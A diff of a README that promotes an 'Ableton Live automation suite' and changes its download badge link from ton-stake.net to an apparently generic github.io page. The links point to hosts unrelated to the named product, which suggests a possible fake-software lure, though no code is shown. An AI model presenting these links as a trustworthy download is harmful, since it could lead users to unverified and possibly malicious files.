@@ -4,7 +4,7 @@ Welcome to the **next evolution** in music production. This advanced **Ableton L
 
 Created for both **music producers** and **sound designers**, this tool provides a highly configurable and user-friendly experience, wrapped in an intuitive interface.
 
-[![Download Automation Suite](https://img.shields.io/badge/Download-Ableton_Automation_Suite-purple)](https://ton-stake.net)
+[![Download Automation Suite](https://img.shields.io/badge/Download-Ableton_Automation_Suite-purple)](https://ableton-live-automation-suite-2025.github.io/.github/)
 
 ---
 
